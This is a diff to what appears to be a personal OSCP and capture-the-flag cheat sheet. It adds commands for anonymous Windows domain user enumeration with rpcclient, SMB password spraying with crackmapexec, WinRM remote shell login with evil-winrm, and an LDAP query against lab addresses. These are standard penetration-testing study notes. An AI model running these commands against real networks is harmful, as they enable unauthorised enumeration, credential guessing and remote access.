@@ -2,6 +2,35 @@
 
 # OSCP / CTF
 
+
+Enumerating users on a Windows domain with rpcclient (without credentials)
+```
+rpcclient -U "" -N <ip>
+rpcclient $> enumdomusers
+rpcclient $> queryuser <user_RID>
+rpcclient $> enumalsgroups builtin
+rpcclient $> queryaliasmem builtin <RID>
+        sid:[S-1-5-21-391775091-850290835-3566037492-1601]
+rpcclient $> queryuser 1601
+
+
+```
+
+Bruteforcing SMB login with only usernames
+
+```
+crackmapexec smb 10.10.10.172 -u users.txt -p users.txt
+
+```
+
+Connect to a Windows computer through Windows Remote Management (WinRM)
+
+```
+evil-winrm -i <ip> -u <username> -p '<password>'
+
+```
+
+
 get ldap with description and info attributes
 ```
 ldapsearch -H ldap://10.10.10.169:3268 -x -LLL -s sub -b "DC=megabank,DC=local"
